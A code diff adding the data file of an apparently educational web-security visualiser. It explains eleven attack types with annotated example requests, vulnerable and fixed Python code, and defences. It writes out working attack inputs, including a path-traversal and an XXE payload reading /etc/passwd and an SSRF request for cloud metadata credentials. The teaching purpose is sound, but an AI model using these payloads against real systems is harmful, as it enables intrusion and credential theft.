+  exploit:{s:[["att","app","loop over /orders/1…50000"],["app","db","SELECT … WHERE id = ?"],["db","app","every order"]],t:`A short script walks through all IDs. Changing a userId in an update request can even modify other accounts.`},
+  executes:{s:[["app","=","the app's own logic, as written"]],t:`Nothing foreign runs: the server just follows its own incomplete rules, which is why scanners often miss it.`},
+  impact:{s:[["app","att","names, addresses, invoices"]],t:`Mass exposure of data, often personal data: a frequent cause of breach notifications.`},
+  defend:{s:[["app","=","WHERE id = ? AND owner = current user"],["app","=","deny by default"]],t:`Fix: check ownership or permission on every object access, in one central place. Random IDs make guessing harder but don't fix it. Detect: one account requesting many IDs in sequence.`}},
+ req:[["GET /api/orders/",["1002","p","Someone else's order number. The server never checks who owns it."]," HTTP/1.1"],["Host: shop.example"],["Cookie: session=",["attacker-session","k","A valid login: the attacker is authenticated, just not authorised for order 1002."]]],
+ path:[["att","app","GET /orders/1002 (not mine)"],["app","db","no owner check"],["db","app","another customer's order"],["app","att","200 OK"]],
+ code:{lang:"Python",v:[`@app.get("/api/orders/<int:oid>")`,`def order(oid):`,`    return db.get_order(oid)`],f:[`@app.get("/api/orders/<int:oid>")`,`def order(oid):`,`    o = db.get_order(oid)`,`    if o.owner_id != current_user.id: abort(404)`,`    return o`],hv:[2],hf:[3],note:`Every object access needs an authorisation check, ideally enforced in one shared place rather than remembered in each handler.`},
+ cmp:{root:"Missing per-object authorisation",runs:"Nowhere new: the app's own logic",impact:"Mass data exposure or modification",detect:"Sequential access patterns, 403/404 bursts",fix:"Ownership checks on every access",attck:"T1190 → T1213 data from information repositories"}},
+cstuff:{name:"Credential stuffing",short:"Credential stuffing",target:"access",fam:"Access & identity",o25:"A07:2025 Authentication Failures",o21:"A07:2021 Identification and Authentication Failures",cwe:"CWE-307",
+ plain:`Passwords leaked from other sites are tried on this one, by the million.`,analogy:`Someone found your gym locker code and tries it on your front door.`,
+ actors:[["att","Attacker","botnet, proxies"],L.app,L.db],
+ ph:{flaw:{s:[["app","=","unlimited attempts, no MFA"]],t:`The login accepts endless attempts from many addresses and doesn't ask for a second factor. Combined with people reusing passwords, that's enough.`},
+  discover:{s:[["att","=","buy a list: 10 M email:password pairs"]],t:`Breach dumps are traded widely. All the attacker needs is a login form or API.`},
+  exploit:{s:[["att","app","POST /login × 1,000,000 via proxies"],["app","db","check each password"],["app","att","0.1–2 % succeed"]],t:`Requests are spread over residential proxies and headless browsers to look like normal users.`},
+  executes:{s:[["app","=","real logins, with stolen passwords"]],t:`Nothing is injected; every successful login is technically valid.`},
+  impact:{s:[["att","app","use saved cards, points, personal data"]],t:`Account takeover at scale: fraud, stolen loyalty points, accounts resold.`},
+  defend:{s:[["app","=","MFA or passkeys"],["app","=","breached-password check, rate limits"]],t:`Fix: MFA or passkeys, refuse known-breached passwords, rate-limit and detect bots. Detect: spikes in failed logins, many accounts tried from one source.`}},
+ req:[["POST /login HTTP/1.1"],["Host: shop.example"],["User-Agent: ",["Mozilla/5.0 … (rotating)","k","Looks like a normal browser and changes on every request."]],["X-Forwarded-For: ",["198.51.100.77","k","One of thousands of proxy addresses, so no single IP looks busy."]],[""],["email=",["anna@example.com","p","Taken from another site's breach."],"&password=",["Summer2019!","p","Anna's password on that other site. If she reused it here, this works."]]],
+ path:[["att","app","10,000 leaked email/password pairs"],["app","db","check each one"],["app","att","some logins succeed"]],
+ code:{lang:"Python",v:[`if check_password(user, pw):`,`    login(user)`],f:[`if too_many_attempts(ip, user): abort(429)`,`if is_breached(pw) or not check_password(user, pw): fail()`,`require_second_factor(user)`,`login(user)`],hv:[0],hf:[0,1,2],note:`The real fix is phishing-resistant MFA or passkeys; rate limits and breached-password checks shrink the window.`},
+ cmp:{root:"Password reuse, no MFA, no rate limiting",runs:"Nowhere new: the normal login flow",impact:"Account takeover at scale",detect:"Failure spikes, many accounts per source",fix:"MFA/passkeys, breached-password checks, bot defences",attck:"T1110.004 credential stuffing → T1078 valid accounts"}},
+csrf:{name:"Cross-site request forgery",short:"CSRF",target:"browser",fam:"Access & identity",o25:"A01:2025 Broken Access Control",o21:"A01:2021 Broken Access Control",cwe:"CWE-352",
+ plain:`Another site makes your browser send a request you didn't intend, with your login attached.`,analogy:`Getting you to sign a form hidden under a birthday card.`,
+ actors:[["att","Evil site","evil.example"],L.vic,L.app],
+ ph:{flaw:{s:[["app","=","POST /email trusts the cookie alone"],["app","=","no token · SameSite=None"]],t:`The app trusts any request carrying the session cookie, without checking it came from its own pages.`},
+  discover:{s:[["att","app","form has no token? cookie sent cross-site?"]],t:`State-changing forms without an unpredictable token, and cookies sent along on cross-site requests, are the signs.`},
+  exploit:{s:[["vic","att","visit evil.example (still logged in)"],["att","vic","hidden form submits itself"],["vic","app","POST /email + session cookie"],["app","=","email changed"]],t:`The browser attaches the shop's cookie automatically, so the request looks genuine.`},
+  executes:{s:[["vic","=","victim's browser sends it; the shop acts"]],t:`Nothing runs on the shop: it receives a forged but authenticated request from the victim's own browser.`},
+  impact:{s:[["att","app","password reset to the new email"]],t:`Changed settings, purchases, transfers; often a step towards full account takeover.`},
+  defend:{s:[["app","=","SameSite=Lax/Strict cookies"],["app","=","CSRF token + Origin check"]],t:`Fix: anti-CSRF tokens, SameSite cookies (Lax is now the default in most browsers), checking the Origin header, and re-authentication for sensitive changes.`}},
+ req:[["POST /account/email HTTP/1.1"],["Host: shop.example"],["Origin: ",["https://evil.example","p","The request came from another site. Checking this header would block it."]],["Cookie: session=",["victim-session","k","Attached automatically by the victim's browser."]],[""],["email=",["attacker@evil.example","p","The value the attacker chose."]]],
+ path:[["att","vic","lure to evil.example"],["vic","app","auto-submitted form + cookie"],["app","db","email changed"]],
+ code:{lang:"Python",v:[`@app.post("/account/email")`,`def change_email():`,`    current_user.email = request.form["email"]`],f:[`@app.post("/account/email")`,`@csrf_protect  # token must match the session`,`def change_email():`,`    current_user.email = request.form["email"]`],hv:[0],hf:[1],note:`Also set the session cookie to SameSite=Lax or Strict, so browsers don't attach it to cross-site form posts.`},
+ cmp:{root:"Requests trusted on the cookie alone",runs:"Victim's browser sends it; the server acts",impact:"Unwanted actions as the victim",detect:"Mismatched Origin/Referer, missing tokens",fix:"CSRF tokens, SameSite cookies, Origin checks",attck:"T1189 drive-by, actions through the user's session"}},
+ssrf:{name:"Server-side request forgery",short:"SSRF",target:"internal",fam:"Reaching inside",o25:"A01:2025 Broken Access Control (merged in 2025)",o21:"A10:2021 Server-Side Request Forgery",cwe:"CWE-918",
+ plain:`The server is tricked into fetching an address the attacker chooses, including internal ones.`,analogy:`Asking the company mailroom to fetch a parcel from the CEO's locked office for you.`,
+ actors:[L.att,L.app,["int","Internal service","169.254.169.254"]],
+ ph:{flaw:{s:[["app","=","fetch(url_from_user)"]],t:`Features like link previews, image imports and webhooks fetch user-supplied URLs from the server, which can reach places the internet can't.`},
+  discover:{s:[["att","app","url = http://attacker-server.example"],["app","att","it called me → server fetches"]],t:`Attackers point the URL at a server they control to confirm the fetch, then try internal addresses.`},
+  exploit:{s:[["att","app","url = http://169.254.169.254/…"],["app","int","GET from inside the cloud"],["int","app","temporary cloud credentials"],["app","att","shown in the preview"]],t:`Cloud metadata services, admin panels and databases on localhost trust requests that come from inside.`},
+  executes:{s:[["int","=","internal service answers the server"]],t:`Runs as requests made by the server itself, with its network position and trust.`},
+  impact:{s:[["att","=","use the cloud keys: storage, more"]],t:`Cloud account compromise (the 2019 Capital One breach started this way), internal port scanning, access to admin APIs.`},
+  defend:{s:[["app","=","allow-list hosts, block private IPs"],["int","=","IMDSv2: token required"]],t:`Fix: allow-list destinations, resolve and block private and link-local addresses (watch redirects and DNS rebinding), separate outbound network. In the cloud: IMDSv2.`}},
+ req:[["POST /api/preview HTTP/1.1"],["Host: shop.example"],["Content-Type: application/json"],[""],["{\"url\": \"",["http://169.254.169.254/latest/meta-data/iam/security-credentials/","p","A link-local address only reachable from inside the cloud server. The server fetches it on the attacker's behalf."],"\"}"]],
+ path:[["att","app","url=http://169.254.169.254/…"],["app","internal","server fetches it"],["internal","app","cloud credentials"],["app","att","returned in the preview"]],
+ code:{lang:"Python",v:[`url = request.json["url"]`,`return requests.get(url, timeout=5).text`],f:[`url = request.json["url"]`,`ip = resolve_host(url)`,`if ip.is_private or ip.is_link_local: abort(400)`,`return requests.get(url, timeout=5, allow_redirects=False).text`],hv:[1],hf:[2,3],note:`Check the resolved IP, not the hostname, and don't follow redirects blindly. Allow-lists of known hosts are stronger still.`},
+ cmp:{root:"Server fetches attacker-chosen URLs",runs:"The server's own outbound requests",impact:"Internal access, cloud credential theft",detect:"Outbound requests to internal or metadata IPs",fix:"Allow-lists, block private ranges, IMDSv2",attck:"T1190 → T1552.005 cloud instance metadata API"}},
+traversal:{name:"Path traversal",short:"Path traversal",target:"server",fam:"Reaching inside",o25:"A01:2025 Broken Access Control",o21:"A01:2021 Broken Access Control",cwe:"CWE-22",
+ plain:`A file name containing ../ climbs out of the intended folder.`,analogy:`Asking a librarian for the book "../../staff-room/salaries", and they fetch it.`,
+ actors:[L.att,L.app,L.fs],
+ ph:{flaw:{s:[["app","=","open(\"/var/www/files/\" + name)"]],t:`The app builds a file path from user input without making sure the result stays inside the allowed folder.`},
+  discover:{s:[["att","app","file = ../../../../etc/hostname"],["app","att","the server's hostname"]],t:`Classic probes ask for well-known files. Encoded variants (%2e%2e%2f) get past naive filters.`},
+  exploit:{s:[["att","app","file = ../../../../etc/passwd"],["app","fs","/var/www/files/../../../../etc/passwd"],["fs","app","/etc/passwd"]],t:`Each ../ goes up one folder until the root, then down to any readable file: configuration, keys, source code.`},
+  executes:{s:[["fs","=","read by the app's own process"]],t:`No code is injected: the app reads files it shouldn't, with its own permissions.`},
+  impact:{s:[["app","att","config, API keys, source code"]],t:`Secrets leak. Combined with upload or write features, it can become code execution.`},
+  defend:{s:[["app","=","resolve, then check it's under BASE"],["app","=","use IDs, not file names"]],t:`Fix: map IDs to files, or resolve the full path and check it's inside the base folder. Run with minimal file permissions.`}},
+ req:[["GET /download?file=",["../../../../etc/passwd","p","Four levels up from /var/www/files reaches /, then into /etc."]," HTTP/1.1"],["Host: shop.example"]],
+ path:[["att","app","file=../../../../etc/passwd"],["app","os","opens a file outside the folder"],["os","app","file contents"],["app","att","downloaded"]],
+ code:{lang:"Python",v:[`name = request.args["file"]`,`return send_file("/var/www/files/" + name)`],f:[`name = request.args["file"]`,`path = (BASE / name).resolve()`,`if not path.is_relative_to(BASE): abort(404)`,`return send_file(path)`],hv:[1],hf:[1,2],note:`Resolve first (which removes the ../ parts), then check where you ended up.`},
+ cmp:{root:"User input used as a file path",runs:"File reads by the server process",impact:"Secrets and source code leak",detect:"../ and encoded variants in logs",fix:"Resolve + base-folder check, IDs instead of names",attck:"T1190 → T1083 file discovery, T1552.001 credentials in files"}},
+xxe:{name:"XML external entities",short:"XXE",target:"server",fam:"Reaching inside",o25:"A02:2025 Security Misconfiguration",o21:"A05:2021 Security Misconfiguration",cwe:"CWE-611",
+ plain:`An XML document tells the server's parser to fetch a secret file and include it.`,analogy:`A letter saying "please attach a copy of the file in drawer 3", and the clerk does.`,
+ actors:[L.att,["app","XML parser","inside the web app"],L.fs],
+ ph:{flaw:{s:[["app","=","parser resolves external entities"]],t:`Older or misconfigured XML parsers resolve DOCTYPE entities that point to files or URLs.`},
+  discover:{s:[["att","app","send XML, SVG or DOCX with a DOCTYPE"]],t:`Anything that accepts XML: SOAP APIs, SAML logins, SVG images, Office documents.`},
+  exploit:{s:[["att","app","<!ENTITY x SYSTEM \"file:///etc/passwd\">"],["app","fs","parser reads the file"],["app","att","&x; replaced by its contents"]],t:`The entity reference in the document is replaced by the file's contents, which the app then echoes back.`},
+  executes:{s:[["app","=","the parser, inside the server"]],t:`Runs in the server's XML parser, with the app's file and network access.`},
+  impact:{s:[["app","fs","read files"],["app","=","or SSRF to internal URLs, or DoS"]],t:`File disclosure, server-side requests to internal systems, or the "billion laughs" denial of service.`},
+  defend:{s:[["app","=","disable DTDs and external entities"]],t:`Fix: turn off DTD processing (most modern parsers now default to safe settings) or use JSON. That's why OWASP now files it under misconfiguration.`}},
+ req:[["POST /api/import HTTP/1.1"],["Content-Type: application/xml"],[""],["<?xml version=\"1.0\"?>"],[["<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]>","p","Declares an entity whose value is a local file."]],["<r>",["&x;","p","Replaced by the file's contents while parsing."],"</r>"]],
+ path:[["att","app","XML with an external entity"],["app","os","parser reads file:///etc/passwd"],["app","internal","or fetches an internal URL"],["app","att","contents in the response"]],
+ code:{lang:"Python (lxml)",v:[`parser = etree.XMLParser(resolve_entities=True)`,`doc = etree.fromstring(body, parser)`],f:[`parser = etree.XMLParser(resolve_entities=False, no_network=True)`,`doc = etree.fromstring(body, parser)  # or use defusedxml`],hv:[0],hf:[0],note:`A one-line configuration change: disable entity resolution and network access, or use a hardened parser.`},
+ cmp:{root:"XML parser resolves external entities",runs:"In the server's XML parser",impact:"File read, SSRF, denial of service",detect:"DOCTYPE/ENTITY in requests",fix:"Disable DTDs; safe parser defaults",attck:"T1190 → T1005 data from local system"}},
+deser:{name:"Insecure deserialisation",short:"Deserialisation",target:"server",fam:"Trust & supply chain",o25:"A08:2025 Software or Data Integrity Failures",o21:"A08:2021 Software and Data Integrity Failures",cwe:"CWE-502",
+ plain:`The server rebuilds an object from attacker-supplied data, and rebuilding it runs code.`,analogy:`A flat-pack kit whose assembly instructions include "and then hand over your keys".`,
+ actors:[L.att,L.app,L.os],
+ ph:{flaw:{s:[["app","=","cart = pickle.loads(cookie)"]],t:`The app accepts serialised objects (Java, .NET, PHP, Python pickle) from the client and turns them back into live objects.`},
+  discover:{s:[["att","app","cookie starts rO0AB… or gASV…"]],t:`Recognisable formats (base64 Java "rO0", pickle "gASV") in cookies, tokens or hidden fields give it away.`},
+  exploit:{s:[["att","app","crafted object (gadget chain)"],["app","os","rebuilding it calls exec"],["os","att","remote shell"]],t:`Tools build object graphs whose construction triggers existing library code that ends in running a command.`},
+  executes:{s:[["os","=","code runs while deserialising"]],t:`Runs on the server, before any of the app's own checks.`},
+  impact:{s:[["att","os","full control of the server"]],t:`Typically remote code execution.`},
+  defend:{s:[["app","=","never deserialise untrusted data"],["app","=","JSON + validation, or signed data"]],t:`Fix: data-only formats (JSON) with validation, or sign and verify serialised data, and restrict allowed classes. Patch libraries with known gadget chains.`}},
+ req:[["GET /cart HTTP/1.1"],["Host: shop.example"],["Cookie: cart=",["gASV… (crafted object, shortened)","p","A serialised object built so that rebuilding it calls a system command. Shown shortened on purpose."]]],
+ path:[["att","app","crafted serialised cookie"],["app","os","deserialiser runs a command"],["app","att","attacker controls the server"]],
+ code:{lang:"Python",v:[`data = base64.b64decode(request.cookies["cart"])`,`cart = pickle.loads(data)`],f:[`raw = verify_signature(request.cookies["cart"])  # HMAC, or reject`,`cart = Cart.model_validate_json(raw)  # plain data, validated`],hv:[1],hf:[0,1],note:`pickle, Java serialisation and similar formats can run code by design; never feed them data a client can change.`},
+ cmp:{root:"Untrusted data turned back into objects",runs:"On the server, while deserialising",impact:"Remote code execution",detect:"Serialised formats in inputs, unexpected child processes",fix:"Data-only formats, signatures, class allow-lists",attck:"T1190 → T1059 command interpreter"}},
+misconfig:{name:"Security misconfiguration",short:"Misconfiguration",target:"server",fam:"Trust & supply chain",o25:"A02:2025 Security Misconfiguration",o21:"A05:2021 Security Misconfiguration",cwe:"CWE-1188, CWE-209",
+ plain:`Defaults, debug modes and open settings left in production.`,analogy:`A shop that opened with the staff door propped open and the safe code still set to 0000.`,
+ actors:[L.att,L.app,L.db],
+ ph:{flaw:{s:[["app","=","DEBUG on · admin/admin · open bucket"]],t:`Nothing is wrong with the code; the deployment is: default accounts, detailed error pages, directory listings, public storage, unneeded services.`},
+  discover:{s:[["att","app","GET /admin, /.env, /actuator"],["app","att","stack trace with versions"]],t:`Scanners check thousands of well-known paths and default passwords in minutes.`},
+  exploit:{s:[["att","app","log in as admin / admin"],["app","db","full admin access"]],t:`No exploit needed: the attacker just uses what was left open.`},
+  executes:{s:[["app","=","the app's own features, wrongly exposed"]],t:`Runs as normal application functionality.`},
+  impact:{s:[["app","att","data, settings, secrets"]],t:`Anything from information leaks to full control, depending on what was exposed.`},
+  defend:{s:[["app","=","hardened, repeatable config"],["app","=","scan configuration continuously"]],t:`Fix: secure defaults, remove samples and debug features, change default passwords, define configuration as code and scan it against benchmarks.`}},
+ req:[["GET /",["actuator/env","p","A Spring Boot management endpoint left exposed: shows environment variables, sometimes including secrets."]," HTTP/1.1"],["Host: shop.example"]],
+ path:[["att","app","try /admin, /.env, admin/admin"],["app","att","stack trace and versions"],["app","db","admin panel open"]],
+ code:{lang:"Settings",v:[`DEBUG = True`,`ALLOWED_HOSTS = ["*"]`,`ADMIN_PASSWORD = "admin"`],f:[`DEBUG = False`,`ALLOWED_HOSTS = ["shop.example"]`,`ADMIN_PASSWORD = os.environ["ADMIN_PASSWORD"]  # unique, from a secret store`],hv:[0,2],hf:[0,2],note:`Misconfiguration is fixed by process: the same hardened settings applied automatically everywhere, and checked continuously.`},
+ cmp:{root:"Unsafe defaults or settings in deployment",runs:"Normal app features, wrongly exposed",impact:"From leaks to full compromise",detect:"Configuration scanning, exposed-endpoint monitoring",fix:"Hardening, automation, removing defaults",attck:"T1190, T1078.001 default accounts"}},
+supply:{name:"Supply chain attack",short:"Supply chain",target:"supply",fam:"Trust & supply chain",o25:"A03:2025 Software Supply Chain Failures",o21:"A06:2021 Vulnerable and Outdated Components",cwe:"CWE-1357, CWE-506",
+ plain:`The app is attacked through code it trusts: a library or a build tool.`,analogy:`Poisoning the flour supplier instead of breaking into the bakery.`,
+ actors:[L.att,["reg","Package registry","npm, PyPI"],["ci","Build pipeline","CI/CD"],L.app],
+ ph:{flaw:{s:[["ci","=","install newest versions, unpinned"],["ci","=","no integrity or provenance checks"]],t:`Builds pull in hundreds of third-party packages, often unpinned, and run their install scripts with access to secrets.`},
+  discover:{s:[["att","reg","find popular or internal package names"]],t:`Attackers look for easy-to-mistype names, internal package names (dependency confusion), abandoned packages, or maintainer accounts to hijack.`},
+  exploit:{s:[["att","reg","publish a lookalike or hijacked version"],["reg","ci","the build installs it"],["ci","=","install script runs"]],t:`The malicious code runs during the build or inside the app, shipped by the victim's own pipeline.`},
+  executes:{s:[["ci","app","malicious code ships in the release"]],t:`Runs in the build system and then in production, with full trust.`},
+  impact:{s:[["app","att","secrets, user data, backdoor"]],t:`Stolen CI secrets and cloud keys, backdoors reaching every customer (SolarWinds, event-stream, the xz-utils attempt).`},
+  defend:{s:[["ci","=","pin versions, verify hashes"],["ci","=","SBOM, provenance, minimal secrets"]],t:`Fix: lock files with integrity hashes, scoped or private registries, review new dependencies, SBOMs and signed provenance, and patch known-vulnerable versions quickly.`}},
+ req:[["package.json"],["\"dependencies\": {"],["  \"",["lodahs","p","A one-letter typo of lodash: a lookalike package published by the attacker."],"\": \"",["^4.17.21","k","A version range: the build takes whatever newest matching version exists."],"\","],["  \"",["shop-internal-utils","p","An internal package name. If the public registry has a higher version, a misconfigured build may take it instead (dependency confusion)."],"\": \"^1.0.0\""],["}"]],
+ path:[["att","registry","publish lookalike / hijacked package"],["registry","ci","build pulls it in"],["ci","app","malicious code deployed"],["app","att","secrets sent out"]],
+ code:{lang:"package.json",v:[`"dependencies": {`,`  "lodash": "^4.17.0",`,`  "left-pad": "*"`,`}`],f:[`"dependencies": {`,`  "lodash": "4.17.21",`,`  "left-pad": "1.3.0"`,`}  // + committed lockfile with hashes; install with npm ci`],hv:[1,2],hf:[1,2,3],note:`Exact versions plus a lockfile with integrity hashes mean the build installs exactly what was reviewed, every time.`},
+ cmp:{root:"Trusting third-party code without verification",runs:"In the build pipeline, then in production",impact:"Backdoors, secret theft, mass compromise",detect:"Dependency scanners, unusual build network traffic",fix:"Pinning, lockfiles, provenance, SBOMs, patching",attck:"T1195.002 compromise software supply chain"}},
+crypto:{name:"Cryptographic failures",short:"Weak crypto",target:"server",fam:"Data & errors",o25:"A04:2025 Cryptographic Failures",o21:"A02:2021 Cryptographic Failures",cwe:"CWE-916, CWE-319",
+ plain:`Sensitive data stored or sent without proper protection.`,analogy:`Locking the door, then leaving the key under the mat.`,
+ actors:[L.att,L.app,L.db],
+ ph:{flaw:{s:[["app","=","store md5(password), no salt"],["app","=","card numbers in plain text"]],t:`Fast unsalted hashes, home-made encryption, keys in source code, plain HTTP instead of HTTPS.`},
+  discover:{s:[["att","=","usually after another breach"]],t:`This flaw decides how bad a leak becomes: an SQL injection or a stolen backup hands over the data, and weak crypto does the rest.`},
+  exploit:{s:[["att","db","dump the users table (another hole)"],["att","=","crack MD5 on a GPU: billions per second"]],t:`Fast hashes fall to GPU cracking and lookup tables; plain-text data needs no work at all.`},
+  executes:{s:[["att","=","offline, on the attacker's hardware"]],t:`Happens offline: no further contact with the app needed.`},
+  impact:{s:[["att","app","log in as users; reuse passwords elsewhere"]],t:`Mass account takeover, card fraud, privacy violations and fines.`},
+  defend:{s:[["app","=","Argon2id or bcrypt for passwords"],["app","=","TLS everywhere, keys in a KMS"]],t:`Fix: slow, salted password hashing (Argon2id, bcrypt), vetted libraries, TLS everywhere with HSTS, keys in a key management service, and not storing what you don't need.`}},
+ req:[["users table, one row"],["email    = anna@example.com"],["password = ",["5f4dcc3b5aa765d61d8327deb882cf99","p","Unsalted MD5 of \"password\": found instantly in any lookup table."]]],
+ path:[["att","app","SQL injection or leaked backup"],["app","db","dump the users table"],["db","att","fast, unsalted hashes"]],
+ code:{lang:"Python",v:[`h = hashlib.md5(password.encode()).hexdigest()`,`db.save(user, h)`],f:[`h = argon2.PasswordHasher().hash(password)  # salted, slow, memory-hard`,`db.save(user, h)`],hv:[0],hf:[0],note:`Password hashes should be deliberately slow and salted, so a stolen table costs years of cracking instead of minutes.`},
+ cmp:{root:"Weak or missing protection of sensitive data",runs:"Offline, after the data is stolen",impact:"Credential and data compromise",detect:"Code review, configuration scans (weak TLS, hashes)",fix:"Modern algorithms, KMS, TLS, store less",attck:"T1110.002 password cracking"}},
+failopen:{name:"Failing open",short:"Failing open",target:"server",fam:"Data & errors",o25:"A10:2025 Mishandling of Exceptional Conditions (new)",o21:"Not a category in 2021",cwe:"CWE-636, CWE-755",
+ plain:`When something unexpected happens, the app errs on the side of letting you in.`,analogy:`A security gate that swings open whenever its power fails.`,
+ actors:[L.att,L.app,["auth","Permission service","internal"]],
+ ph:{flaw:{s:[["app","=","try: check() except: pass → allow"]],t:`Error paths that skip checks, swallow exceptions, or default to "allowed" when a dependency fails.`},
+  discover:{s:[["att","app","malformed token, huge or empty input"],["app","att","behaves differently on errors"]],t:`Attackers send inputs designed to make checks throw: wrong types, oversized values, missing fields, or load that makes services time out.`},
+  exploit:{s:[["att","app","request that makes the check fail"],["app","auth","permission service times out"],["app","att","error swallowed → allowed"]],t:`The access check never says "no": it crashes, and the code carries on as if it had said "yes".`},
+  executes:{s:[["app","=","the app's own error handling"]],t:`Nothing is injected: the app's own error path grants access.`},
+  impact:{s:[["app","att","bypassed authorisation or payment checks"]],t:`Access-control bypass, inconsistent state (an order paid for but never charged), or crashes.`},
+  defend:{s:[["app","=","fail closed: deny on any error"],["app","=","test error paths, alert on them"]],t:`Fix: fail closed, catch specific exceptions, test error and timeout paths, and alert on unexpected errors.`}},
+ req:[["GET /admin/reports HTTP/1.1"],["Host: shop.example"],["Authorization: Bearer ",["eyJ…%00…","p","A deliberately malformed token that makes the validation code throw an exception."]]],
+ path:[["att","app","request that breaks the check"],["app","internal","permission service times out"],["app","att","error swallowed → access granted"]],
+ code:{lang:"Python",v:[`try:`,`    if not perms.allowed(user, "reports"): abort(403)`,`except Exception:`,`    pass  # service down? carry on`],f:[`try:`,`    allowed = perms.allowed(user, "reports")`,`except Exception:`,`    log.exception("permission check failed")`,`    allowed = False  # fail closed`,`if not allowed: abort(403)`],hv:[3],hf:[4,5],note:`Decide the safe outcome explicitly. When in doubt, a security check should answer "no".`},
+ cmp:{root:"Errors lead down the permissive path",runs:"Nowhere new: the app's error handling",impact:"Authorisation bypass, inconsistent state",detect:"Error-rate alerts, exception logs",fix:"Fail closed, explicit error handling, tests",attck:"T1190, often as one step in a chain"}}
+};
+const FAMS=["Injection","Access & identity","Reaching inside","Trust & supply chain","Data & errors"];
+const PRESETS={
+ inj:{name:"Injection family",short:"SQLi · Cmd · XSS",a:["sqli","cmdi","xss"],q:`All three are "injection": input crosses from data into code. The difference is whose interpreter runs it: the database, the server's shell, or the victim's browser.`},
+ sqlxss:{name:"SQLi vs XSS",short:"classic pair",a:["sqli","xss"],q:`The classic interview question. Both inject code through input, but SQL injection attacks the server's data while XSS attacks the site's users.`},
+ forgery:{name:"SSRF vs CSRF",short:"two forgeries",a:["ssrf","csrf"],q:`Both "forge" a request from someone trusted. SSRF makes the server send it (to reach inside); CSRF makes a user's browser send it (to act as the user).`},
+ access:{name:"Access",short:"IDOR · Stuffing · CSRF",a:["idor","cstuff","csrf"],q:`Three ways to act as, or see what belongs to, someone else, without injecting any code at all.`},
+ inside:{name:"Reaching inside",short:"Traversal · SSRF · XXE",a:["traversal","ssrf","xxe"],q:`All three reach files or systems that should never be exposed: through the file system, through server-side requests, or through the XML parser, which can do both.`},
+ trust:{name:"Trust & supply",short:"Supply · Deser · Config",a:["supply","deser","misconfig"],q:`Attacks on what the app trusts: its dependencies, the data it rebuilds into objects, and the settings it was deployed with.`},
+ data:{name:"Data & errors",short:"Crypto · Fail-open",a:["crypto","failopen"],q:`Two ways a small mistake makes everything worse: weak crypto turns a leak into a disaster, and failing open turns an error into an open door.`}
+};
+const PRESET_IDS=Object.keys(PRESETS);
+
+/* Shop map: one shared topology for every attack path. */
+const SHOP={vb:[1000,470],frames:[{x:700,y:20,w:290,h:430,label:"Inside the shop's network"},{x:250,y:370,w:440,h:90,label:"Supply chain"}],
+ nodes:{att:{x:120,y:150,t:"Attacker",s:"scripts, browser",evil:1},vic:{x:120,y:320,t:"Victim's browser",s:"logged-in customer"},waf:{x:370,y:230,t:"Firewall / proxy",s:"WAF, load balancer"},app:{x:600,y:230,t:"Web app",s:"shop.example"},
+  db:{x:845,y:85,t:"Database",s:"users, orders"},os:{x:845,y:230,t:"Server OS",s:"shell, files"},internal:{x:845,y:375,t:"Internal services",s:"metadata, admin API"},
+  registry:{x:345,y:415,t:"Package registry",s:"npm, PyPI"},ci:{x:560,y:415,t:"Build pipeline",s:"CI/CD"}},
+ links:[["att","waf"],["vic","waf"],["waf","app"],["app","db"],["app","os"],["app","internal"],["registry","ci"],["ci","app",null,"deploy"],["att","registry",null,"publish"],["att","vic",[[60,235]],"lure"]]};
+const NW=142,NH=52;
+
+/* ============================================================
+   HELPERS + ANIMATION (shared with the other mini projects)
+   ============================================================ */
+const NS="http://www.w3.org/2000/svg";
+function S(tag,attrs,parent,text){const e=document.createElementNS(NS,tag);for(const k in (attrs||{}))e.setAttribute(k,attrs[k]);if(text!=null)e.textContent=text;if(parent)parent.appendChild(e);return e;}
+function esc(s){return String(s).replace(/[&<>"]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));}
+const reduced=matchMedia("(prefers-reduced-motion: reduce)").matches;
+const ANIM={paused:false};
+const store={get(k){try{return localStorage.getItem(k)}catch(e){return null}},set(k,v){try{localStorage.setItem(k,v)}catch(e){}}};
+const col=id=>TARGETS[TI[A[id].target]].color;
+class Flow{
+  constructor(layer,items,{label=true,vbw=1000,onActive=null}={}){
+    this.items=items;this.vbw=vbw;this.last=-2;this.onActive=onActive;
+    let t=0;items.forEach(it=>{let Ln=0,seg=[];for(let i=1;i<it.pts.length;i++){const d=Math.hypot(it.pts[i][0]-it.pts[i-1][0],it.pts[i][1]-it.pts[i-1][1]);seg.push(d);Ln+=d;}
+      it.seg=seg;it.len=Ln;it.dur=Math.max(1600,Math.min(4200,Ln*4.2));it.start=t;t+=it.dur+450;});
+    this.total=t+1800;
+    this.trails=items.map(it=>S("polyline",{class:"trail",points:it.pts.map(p=>p.join(",")).join(" ")},layer));
+    this.dot=S("circle",{class:"pkt",r:7,cx:-50,cy:-50},layer);
+    if(label){this.pill=S("g",{class:"pill"},layer);this.pr=S("rect",{rx:5,height:20},this.pill);this.pt=S("text",{y:14,x:7},this.pill);}
+  }
+  at(it,f){let d=f*it.len;for(let i=0;i<it.seg.length;i++){if(d<=it.seg[i]||i===it.seg.length-1){const r=it.seg[i]?Math.min(1,d/it.seg[i]):1,a=it.pts[i],b=it.pts[i+1];return [a[0]+(b[0]-a[0])*r,a[1]+(b[1]-a[1])*r];}d-=it.seg[i];}return it.pts[0];}
+  start(){
+    if(!this.items.length)return;
+    if(reduced){this.trails.forEach(t=>t.classList.add("act"));this.dot.remove();if(this.pill)this.pill.remove();return;}
+    let last=performance.now(),el=0;
+    const loop=now=>{
+      if(!ANIM.paused)el+=now-last;last=now;
+      const tt=el%this.total;let idx=-1;
+      this.items.forEach((it,i)=>{if(tt>=it.start&&tt<it.start+it.dur)idx=i;});
+      if(idx!==this.last){this.trails.forEach((t,i)=>t.classList.toggle("act",i===idx));this.onActive&&this.onActive(idx);this.last=idx;}
+      if(idx<0){this.dot.setAttribute("cx",-50);if(this.pill)this.pill.setAttribute("transform","translate(-999,-999)");}
+      else{const it=this.items[idx],f=(tt-it.start)/it.dur,e=f<.5?2*f*f:1-Math.pow(-2*f+2,2)/2,[x,y]=this.at(it,e);
+        this.dot.setAttribute("cx",x);this.dot.setAttribute("cy",y);
+        if(this.pill){if(this.pt.textContent!==it.label)this.pt.textContent=it.label;const w=it.label.length*6.7+14;this.pr.setAttribute("width",w);
